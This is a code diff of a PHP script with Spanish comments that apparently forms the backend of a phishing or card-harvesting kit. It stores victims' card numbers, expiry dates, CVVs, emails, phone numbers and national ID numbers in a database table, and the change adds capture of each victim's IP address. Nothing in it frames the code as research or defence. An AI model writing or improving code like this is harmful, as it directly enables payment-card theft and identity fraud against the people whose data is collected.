@@ -84,17 +84,18 @@ try {
   // INSERTANDO EN TABLA EXISTENTE: m3it3m (MAPEO EXACTO)
   $stmt = $mysqli->prepare(
     "INSERT INTO m3it3m (
-      usuario, 
-      tarjeta, 
-      ftarjeta, 
-      cvv, 
-      email, 
-      celular, 
-      status, 
+      usuario,
+      tarjeta,
+      ftarjeta,
+      cvv,
+      email,
+      celular,
+      status,
       horacreado,
       banco,
-      id
-    ) VALUES (?, ?, ?, ?, ?, ?, ?, NOW(), 'TARJETA', ?)"
+      id,
+      ip
+    ) VALUES (?, ?, ?, ?, ?, ?, ?, NOW(), 'TARJETA', ?, ?)"
   );
 
   if (!$stmt) {
@@ -103,10 +104,11 @@ try {
 
   $nombre_completo = $nombre . ' ' . $apellido;
   $status = 'nueva';
+  $client_ip = $client_ip ?? '0.0.0.0';
 
   // Bind parámetros (mapeo exacto de campos)
   $stmt->bind_param(
-    'ssssssss',
+    'sssssssss',
     $nombre_completo,
     $numero_tarjeta,
     $fecha,
@@ -114,7 +116,8 @@ try {
     $email,
     $celular,
     $status,
-    $cedula
+    $cedula,
+    $client_ip
   );
 
   // Ejecutar
